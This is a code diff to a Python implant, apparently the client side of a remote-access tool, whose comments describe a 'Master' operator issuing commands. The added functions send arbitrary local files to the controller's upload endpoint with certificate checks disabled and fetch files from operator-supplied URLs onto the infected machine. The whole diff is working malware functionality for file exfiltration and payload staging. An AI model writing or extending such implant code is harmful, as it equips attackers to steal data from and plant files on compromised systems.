@@ -5,6 +5,9 @@ import os
 import getpass
 import socket
 
+# part of standard library
+import shutil
+
 requests.packages.urllib3.disable_warnings()
 
 SETTINGS={
@@ -29,8 +32,41 @@ def gen_urls():
         else:
             i = 0
 
+# Avoid additional dependencies on client
+def get_upload_url(url):
+    prefix, suffix = url.rsplit("/", 1)
+    file, query = suffix.split("?", 1)
+    file = "/upload.php"
+    if query:
+        query = "?"+query
+
+    return "{}{}{}".format(prefix, file, query)
+
+def send_file(filename, url=None):
+    if not url:
+        url = get_upload_url(SETTINGS['url'])
+    print_debug("send_file({}, {})".format(filename, url))
+    try:
+        f = open(filename, 'rb')
+        requests.post(url, files={filename:f}, verify=False)
+    except Exception as e:
+        print_debug(e)
+
+# Master types "download". This function fulfills the command.
+# From the implant's perspective, this is an upload
+def download(filename, url=None):
+    send_file(filename, url=url)
+
+# Master types "upload". This function fulfills the command.
+# From the implant's perspective, this is an download
+def upload(url):
+    filename = os.path.basename(requests.utils.urlparse(url).path)
+    r = requests.get(url, verify=False, stream=True)
+    with open(filename, 'wb') as f:
+        shutil.copyfileobj(r.raw, f)
+
 def send_msg(m=None, *args):
-    print("send_msg({}, {})".format(m, args))
+    print_debug("send_msg({}, {})".format(m, args))
     i = 0
     if "url" not in SETTINGS:
         MODULES["gen_urls"] = gen_urls()
